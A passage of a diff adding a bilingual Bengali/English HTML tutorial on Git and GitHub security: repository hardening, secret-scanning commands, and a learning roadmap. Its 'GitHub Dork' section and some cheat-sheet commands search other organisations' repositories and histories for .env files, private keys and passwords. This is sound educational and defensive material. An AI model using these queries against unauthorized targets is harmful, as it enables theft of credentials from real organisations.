+        <li>✅ <code>.gitignore</code> → <span class="bn-text">প্রতিটি project-এ .env যোগ করো</span><span class="en-text">Add .env to every project</span></li>
+        <li>✅ pre-commit → Gitleaks hook → <span class="bn-text">commit-এর আগে scan</span><span class="en-text">Scan before commit</span></li>
+        <li>✅ GitHub Secrets → <span class="bn-text">CI/CD-এ hardcode করো না</span><span class="en-text">Don't hardcode in CI/CD</span></li>
+        <li>✅ OIDC → <span class="bn-text">AWS/GCP-তে static key-এর বদলে ব্যবহার করো</span><span class="en-text">Use instead of static AWS/GCP keys</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ══ CH 08: REPO HARDENING ══ -->
+<div class="chapter ch8">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 08</div>
+    <div class="chapter-title">🛡️ Repository Hardening</div>
+    <div class="chapter-desc"><span class="bn-text">Branch protection, Signed commits, Dependabot — Repo secure করো</span><span class="en-text">Branch protection, Signed commits, Dependabot — Secure your repo</span></div>
+  </div>
+  <div class="chapter-body">
+    <h2 class="sec">Branch Protection Rules</h2>
+    <div class="code">
+<span class="c"># GitHub → Settings → Branches → Add branch protection rule</span>
+
+<span class="c"># main branch-এর জন্য:</span>
+✓ Require a pull request before merging
+  ✓ Required number of approvals: 2
+  ✓ Dismiss stale pull request approvals when new commits are pushed
+  ✓ Require review from Code Owners
+✓ Require status checks to pass before merging
+  ✓ Require branches to be up to date before merging
+  ✓ Status checks: ci/test, security/scan
+✓ Require conversation resolution before merging
+✓ Require signed commits              <span class="c"># GPG signed!</span>
+✓ Require linear history              <span class="c"># No merge commits</span>
+✓ Do not allow bypassing the above settings
+✓ Restrict who can push to matching branches
+
+<span class="c"># CLI দিয়ে (gh CLI):</span>
+gh api repos/:owner/:repo/branches/main/protection \
+  -X PUT \
+  -f required_status_checks='{"strict":true,"contexts":["ci"]}' \
+  -f enforce_admins=true \
+  -f required_pull_request_reviews='{"required_approving_review_count":2}'
+    </div>
+
+    <h2 class="sec">Signed Commits — <span class="bn-text">Commit-এর পরিচয় নিশ্চিত করো</span><span class="en-text">Verify Commit Identity</span></h2>
+    <div class="code">
+<span class="c"># GPG Key দিয়ে commit sign করো</span>
+
+<span class="c"># GPG key তৈরি:</span>
+gpg --full-generate-key     <span class="c"># RSA 4096 বেছে নাও</span>
+gpg --list-secret-keys --keyid-format=long
+
+<span class="c"># Git-এ configure করো:</span>
+git config --global user.signingkey YOUR_GPG_KEY_ID
+git config --global commit.gpgsign true   <span class="c"># Auto-sign</span>
+
+<span class="c"># Public key → GitHub-এ add:</span>
+gpg --armor --export YOUR_GPG_KEY_ID
+<span class="c"># Settings → SSH and GPG keys → New GPG key</span>
+
+<span class="c"># Signed commit করো:</span>
+git commit -S -m "feat: secure update"   <span class="c"># Manual sign</span>
+git log --show-signature                  <span class="c"># Verify</span>
+
+<span class="c"># SSH Key দিয়ে sign (modern approach):</span>
+git config --global gpg.format ssh
+git config --global user.signingkey ~/.ssh/id_ed25519.pub
+git config --global commit.gpgsign true
+    </div>
+
+    <h2 class="sec">Dependabot — <span class="bn-text">Auto Vulnerability Fix</span><span class="en-text">Auto Vulnerability Fix</span></h2>
+    <div class="code">
+<span class="c"># .github/dependabot.yml:</span>
+version: 2
+updates:
+  <span class="c"># Python dependencies</span>
+  - package-ecosystem: "pip"
+    directory: "/"
+    schedule:
+      interval: "weekly"
+    open-pull-requests-limit: 10
+    reviewers:
+      - "security-team"
+    labels:
+      - "security"
+      - "dependencies"
+
+  <span class="c"># Node.js dependencies</span>
+  - package-ecosystem: "npm"
+    directory: "/"
+    schedule:
+      interval: "daily"    <span class="c"># Security patch দ্রুত</span>
+
+  <span class="c"># GitHub Actions</span>
+  - package-ecosystem: "github-actions"
+    directory: "/"
+    schedule:
+      interval: "weekly"
+
+<span class="c"># Dependabot alerts চালু:</span>
+<span class="c"># Settings → Security → Dependabot → Enable all</span>
+    </div>
+
+    <h2 class="sec">CodeQL — <span class="bn-text">Automated Code Analysis</span><span class="en-text">Automated Code Analysis</span></h2>
+    <div class="code">
+<span class="c"># .github/workflows/codeql.yml:</span>
+name: CodeQL Security Analysis
+on:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+  schedule:
+    - cron: '0 2 * * 1'   <span class="c"># Weekly scan</span>
+
+jobs:
+  analyze:
+    runs-on: ubuntu-latest
+    permissions:
+      security-events: write
+      contents: read
+    strategy:
+      matrix:
+        language: ['python', 'javascript']
+
+    steps:
+      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+      - uses: github/codeql-action/init@v3
+        with:
+          languages: ${{ matrix.language }}
+          queries: security-extended    <span class="c"># বেশি rules</span>
+      - uses: github/codeql-action/autobuild@v3
+      - uses: github/codeql-action/analyze@v3
+
+<span class="c"># CODEOWNERS file:</span>
+<span class="c"># .github/CODEOWNERS:</span>
+<span class="g">*                   @org/security-team    # সব file</span>
+<span class="g">*.yml               @org/devops-team</span>
+<span class="g">src/auth/           @org/security-team @org/backend</span>
+<span class="g">infrastructure/     @org/devops-team</span>
+    </div>
+
+    <h2 class="sec">Security Checklist</h2>
+    <div class="grid2">
+      <div class="card success-card">
+        <h4>✅ <span class="bn-text">Repo Security Checklist</span><span class="en-text">Repo Security Checklist</span></h4>
+        <ul>
+          <li>Branch protection rules চালু</li>
+          <li>Signed commits require করো</li>
+          <li>2FA সব contributor-এর জন্য enforce</li>
+          <li>CODEOWNERS file আছে</li>
+          <li>Dependabot চালু</li>
+          <li>CodeQL চালু</li>
+          <li>Secret scanning চালু</li>
+          <li>.gitignore ঠিকঠাক</li>
+          <li>pre-commit hooks active</li>
+          <li>Actions permission minimum</li>
+        </ul>
+      </div>
+      <div class="card danger-card">
+        <h4>❌ <span class="bn-text">যা করবে না</span><span class="en-text">Never Do</span></h4>
+        <ul>
+          <li>Secret code-এ hardcode করা</li>
+          <li>.env commit করা</li>
+          <li>Admin-এ force push allow করা</li>
+          <li>Third-party Action trust করা (SHA pin ছাড়া)</li>
+          <li>pull_request_target-এ PR code checkout</li>
+          <li>Self-hosted runner-এ untrusted code</li>
+          <li>Public repo-তে internal info</li>
+          <li>Static cloud credentials in Actions</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>🛡️ Hardening <span class="bn-text">মনে রাখো</span><span class="en-text">Remember</span></h3>
+      <ul>
+        <li>✅ Branch Protection → PR required, Status check, Signed commits</li>
+        <li>✅ Dependabot → <span class="bn-text">Auto vulnerability PR তৈরি করে</span><span class="en-text">Auto creates vulnerability PRs</span></li>
+        <li>✅ CodeQL → <span class="bn-text">Free SAST tool, GitHub-এ built-in</span><span class="en-text">Free SAST tool, built into GitHub</span></li>
+        <li>✅ CODEOWNERS → <span class="bn-text">Sensitive path-এ auto reviewer add</span><span class="en-text">Auto adds reviewers to sensitive paths</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ══ CH 09: CHEAT SHEET + ROADMAP ══ -->
+<div class="chapter ch9">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 09</div>
+    <div class="chapter-title">📋 Cheat Sheet & Roadmap</div>
+    <div class="chapter-desc"><span class="bn-text">সব গুরুত্বপূর্ণ কমান্ড ও Git Security শেখার পথ</span><span class="en-text">All important commands and the Git Security learning path</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">🔍 Secret Scanning Cheat Sheet</h2>
+    <div class="cheat-grid">
+      <div class="cheat-card">
+        <div class="cheat-card-header" style="background:#051a0d;">🐷 TruffleHog</div>
+        <div class="cheat-card-body">
+          <div class="cheat-row"><span class="cheat-cmd">trufflehog git file://./repo</span><span class="cheat-desc"><span class="bn-text">Local repo scan</span><span class="en-text">Local repo scan</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">trufflehog git file://. --only-verified</span><span class="cheat-desc"><span class="bn-text">Verified only</span><span class="en-text">Verified only</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">trufflehog github --repo URL</span><span class="cheat-desc"><span class="bn-text">Remote repo</span><span class="en-text">Remote repo</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">trufflehog github --org ORG</span><span class="cheat-desc"><span class="bn-text">Whole org</span><span class="en-text">Whole org</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">trufflehog filesystem /path</span><span class="cheat-desc"><span class="bn-text">File system scan</span><span class="en-text">File system scan</span></span></div>
+        </div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-card-header" style="background:#051a0d;">🔏 Gitleaks</div>
+        <div class="cheat-card-body">
+          <div class="cheat-row"><span class="cheat-cmd">gitleaks detect --source .</span><span class="cheat-desc"><span class="bn-text">Detect secrets</span><span class="en-text">Detect secrets</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">gitleaks detect -f json -r report.json</span><span class="cheat-desc">JSON report</span></div>
+          <div class="cheat-row"><span class="cheat-cmd">gitleaks protect --staged</span><span class="cheat-desc">Pre-commit check</span></div>
+          <div class="cheat-row"><span class="cheat-cmd">gitleaks detect --log-opts="HEAD~10..HEAD"</span><span class="cheat-desc"><span class="bn-text">Last 10 commits</span><span class="en-text">Last 10 commits</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">gitleaks detect --verbose</span><span class="cheat-desc"><span class="bn-text">Verbose output</span><span class="en-text">Verbose output</span></span></div>
+        </div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-card-header" style="background:#1a0a00;">📜 Git Manual</div>
+        <div class="cheat-card-body">
+          <div class="cheat-row"><span class="cheat-cmd">git log --all -S "password"</span><span class="cheat-desc"><span class="bn-text">Password-এ search</span><span class="en-text">Search for "password"</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">git log --all --full-history -- **/.env</span><span class="cheat-desc"><span class="bn-text">.env file history</span><span class="en-text">.env file history</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">git show HASH:path/to/file</span><span class="cheat-desc"><span class="bn-text">Old version দেখো</span><span class="en-text">See old version</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">git grep "API_KEY" $(git rev-list --all)</span><span class="cheat-desc"><span class="bn-text">All commits grep</span><span class="en-text">All commits grep</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">git log --format="%ae" | sort -u</span><span class="cheat-desc"><span class="bn-text">Committer emails</span><span class="en-text">Committer emails</span></span></div>
+        </div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-card-header" style="background:#1a0a00;">🧹 History Clean</div>
+        <div class="cheat-card-body">
+          <div class="cheat-row"><span class="cheat-cmd">java -jar bfg.jar --delete-files .env repo.git</span><span class="cheat-desc"><span class="bn-text">.env মুছো</span><span class="en-text">Delete .env</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">java -jar bfg.jar --replace-text passwords.txt repo.git</span><span class="cheat-desc"><span class="bn-text">String replace</span><span class="en-text">String replace</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">git gc --prune=now --aggressive</span><span class="cheat-desc"><span class="bn-text">Cleanup</span><span class="en-text">Cleanup</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">git push --force --all</span><span class="cheat-desc"><span class="bn-text">Force push</span><span class="en-text">Force push</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">git rm --cached .env</span><span class="cheat-desc"><span class="bn-text">Untrack .env</span><span class="en-text">Untrack .env</span></span></div>
+        </div>
+      </div>
+    </div>
+
+    <h2 class="sec">🔎 GitHub Dork Quick Reference</h2>
+    <div class="code">
+<span class="c"># github.com/search?q=QUERY&type=code</span>
+org:TARGET filename:.env
+org:TARGET "aws_access_key_id"
+org:TARGET "BEGIN RSA PRIVATE KEY"
+org:TARGET password extension:yml
+org:TARGET "DB_PASSWORD" filename:.env
+org:TARGET "SECRET_KEY" language:python
+org:TARGET filename:wp-config.php
+org:TARGET "-----BEGIN" extension:pem
+user:USERNAME "api_key"
+    </div>
+
+    <h2 class="sec">🗺️ Git Security Roadmap</h2>
+    <div class="roadmap-phase">
+      <div class="phase-number" style="background:linear-gradient(135deg,#238636,#2dc653);">1</div>
+      <div class="phase-content">
+        <div class="phase-title" style="color:#238636;">🔰 <span class="bn-text">Phase 1 — ভিত্তি</span><span class="en-text">Phase 1 — Foundation</span> <span class="badge badge-g">1 সপ্তাহ</span></div>
+        <div class="phase-desc"><span class="bn-text">Git কীভাবে কাজ করে, কী কী ভুল হয় — এটা জানা না থাকলে বাকিটা বোঝা যাবে না।</span><span class="en-text">Without knowing how Git works and what mistakes happen, the rest won't make sense.</span></div>
+        <div class="phase-items">
+          <span class="phase-item" style="color:#238636;">Git internals</span>
+          <span class="phase-item" style="color:#238636;">Common mistakes</span>
+          <span class="phase-item" style="color:#238636;">.gitignore setup</span>
+          <span class="phase-item" style="color:#238636;">GitHub basics</span>
+        </div>
+      </div>
+    </div>
+    <div class="roadmap-arrow">↓</div>
+    <div class="roadmap-phase">
+      <div class="phase-number" style="background:linear-gradient(135deg,#0077b6,#00b4d8);">2</div>
+      <div class="phase-content">
+        <div class="phase-title" style="color:#0077b6;">🔍 <span class="bn-text">Phase 2 — Secret Scanning</span><span class="en-text">Phase 2 — Secret Scanning</span> <span class="badge badge-b">1-2 সপ্তাহ</span></div>
+        <div class="phase-desc"><span class="bn-text">TruffleHog, Gitleaks শেখো এবং নিজের project-এ apply করো।</span><span class="en-text">Learn TruffleHog and Gitleaks and apply them to your own projects.</span></div>
+        <div class="phase-items">
+          <span class="phase-item" style="color:#0077b6;">TruffleHog</span>
+          <span class="phase-item" style="color:#0077b6;">Gitleaks</span>
+          <span class="phase-item" style="color:#0077b6;">pre-commit hooks</span>
+          <span class="phase-item" style="color:#0077b6;">GitHub Dorking</span>
+        </div>
+      </div>
+    </div>
+    <div class="roadmap-arrow">↓</div>
+    <div class="roadmap-phase">
+      <div class="phase-number" style="background:linear-gradient(135deg,#f4831f,#ffd60a);">3</div>
+      <div class="phase-content">
+        <div class="phase-title" style="color:#f4831f;">⚙️ <span class="bn-text">Phase 3 — CI/CD Security</span><span class="en-text">Phase 3 — CI/CD Security</span> <span class="badge badge-y">2-3 সপ্তাহ</span></div>
+        <div class="phase-desc"><span class="bn-text">GitHub Actions secure করো, supply chain বোঝো।</span><span class="en-text">Secure GitHub Actions and understand the supply chain.</span></div>
+        <div class="phase-items">
+          <span class="phase-item" style="color:#f4831f;">Actions security</span>
+          <span class="phase-item" style="color:#f4831f;">OIDC setup</span>
+          <span class="phase-item" style="color:#f4831f;">Supply chain</span>
+          <span class="phase-item" style="color:#f4831f;">Dependabot</span>
+        </div>
+      </div>
+    </div>
+    <div class="roadmap-arrow">↓</div>
+    <div class="roadmap-phase">
+      <div class="phase-number" style="background:linear-gradient(135deg,#7b2d8b,#a855f7);">4</div>
+      <div class="phase-content">
+        <div class="phase-title" style="color:#7b2d8b;">🏆 <span class="bn-text">Phase 4 — Advanced & Bug Bounty</span><span class="en-text">Phase 4 — Advanced & Bug Bounty</span> <span class="badge badge-p"><span class="bn-text">চলমান</span><span class="en-text">Ongoing</span></span></div>
+        <div class="phase-desc"><span class="bn-text">Real repo-তে secret খোঁজো, Bug Bounty program-এ report করো।</span><span class="en-text">Find secrets in real repos and report to Bug Bounty programs.</span></div>
+        <div class="phase-items">
+          <span class="phase-item" style="color:#7b2d8b;">GitHub Recon</span>
+          <span class="phase-item" style="color:#7b2d8b;">Org enumeration</span>
+          <span class="phase-item" style="color:#7b2d8b;">Bug Bounty report</span>
+          <span class="phase-item" style="color:#7b2d8b;">CodeQL queries</span>
+        </div>
+      </div>
+    </div>
+
+    <h2 class="sec">📚 <span class="bn-text">সেরা Resources</span><span class="en-text">Best Resources</span></h2>
+    <table>
+      <thead><tr><th>Resource</th><th><span class="bn-text">ধরন</span><span class="en-text">Type</span></th><th><span class="bn-text">বিষয়</span><span class="en-text">Topic</span></th></tr></thead>
+      <tbody>
+        <tr><td><strong>TruffleHog</strong></td><td>Tool</td><td><span class="bn-text">সেরা secret scanner</span><span class="en-text">Best secret scanner</span></td></tr>
+        <tr><td><strong>Gitleaks</strong></td><td>Tool</td><td><span class="bn-text">Fast, CI/CD-এ ব্যবহার করো</span><span class="en-text">Fast, use in CI/CD</span></td></tr>
+        <tr><td><strong>GitGuardian</strong></td><td>SaaS</td><td><span class="bn-text">Real-time monitoring</span><span class="en-text">Real-time monitoring</span></td></tr>
+        <tr><td><strong>GitHub Secret Scanning</strong></td><td>Built-in</td><td><span class="bn-text">Free for public repos</span><span class="en-text">Free for public repos</span></td></tr>
+        <tr><td><strong>BFG Repo Cleaner</strong></td><td>Tool</td><td><span class="bn-text">History cleanup</span><span class="en-text">History cleanup</span></td></tr>
+        <tr><td><strong>PortSwigger Web Academy</strong></td><td>Course</td><td>Supply chain labs</td></tr>
+        <tr><td><strong>OWASP Top 10 CI/CD</strong></td><td>Standard</td><td>CI/CD security risks</td></tr>
+        <tr><td><strong>GitHub Docs — Security</strong></td><td>Docs</td><td><span class="bn-text">Official best practices</span><span class="en-text">Official best practices</span></td></tr>
+      </tbody>
+    </table>
+
+    <!-- Footer -->
+    <div style="text-align:center; margin-top:50px; padding:30px; background:linear-gradient(135deg,#010a04,#0a2a15); border-radius:12px; color:rgba(255,255,255,0.8);">
+      <p style="font-size:20px; color:#56d364; margin-bottom:10px;">🔐 "Git history never forgets — but attackers never forget either."</p>
+      <p><span class="bn-text">এই ডকুমেন্ট সম্পূর্ণ শিক্ষামূলক উদ্দেশ্যে। নিজের ও authorized environment-এ practice করো।</span>
+         <span class="en-text">This document is entirely for educational purposes. Practice on your own and authorized environments.</span></p>
+      <p style="margin-top:12px; font-size:12px; color:#56d364;">v1.0 — Git & GitHub Security | Secret Scanning · Supply Chain · CI/CD | Bilingual | Dark/Light Mode</p>
+    </div>
+  </div>
+</div>
+
+<script>
+  document.body.classList.add('light-mode');
+  function toggleTheme() {
+    const btn = document.getElementById('themeBtn'), b = document.body;
+    if (b.classList.contains('light-mode')) {
+      b.classList.replace('light-mode','dark-mode');
+      btn.textContent='☀️ Light Mode'; btn.style.background='#ffd60a'; btn.style.color='#010a04';
+      localStorage.setItem('git_theme','dark');
+    } else {
+      b.classList.replace('dark-mode','light-mode');
+      btn.textContent='🌙 Dark Mode'; btn.style.background='#2dc653'; btn.style.color='#0d1b2a';
+      localStorage.setItem('git_theme','light');
+    }
+  }
+  function toggleLang() {
+    const btn = document.getElementById('langBtn'), b = document.body;
+    if (b.classList.contains('lang-en')) {
+      b.classList.remove('lang-en');
+      btn.textContent='🇬🇧 English'; btn.style.background='#238636';
+      localStorage.setItem('git_lang','bn');
+    } else {
+      b.classList.add('lang-en');
+      btn.textContent='🇧🇩 বাংলা'; btn.style.background='#e63946';
+      localStorage.setItem('git_lang','en');
+    }
+  }
+  window.addEventListener('DOMContentLoaded',()=>{
+    const t=localStorage.getItem('git_theme'), l=localStorage.getItem('git_lang');
+    if(t==='dark'){document.body.classList.replace('light-mode','dark-mode');const b=document.getElementById('themeBtn');if(b){b.textContent='☀️ Light Mode';b.style.background='#ffd60a';b.style.color='#010a04';}}
+    if(l==='en'){document.body.classList.add('lang-en');const b=document.getElementById('langBtn');if(b){b.textContent='🇧🇩 বাংলা';b.style.background='#e63946';}}
+  });
+</script>
+</body>
+</html>
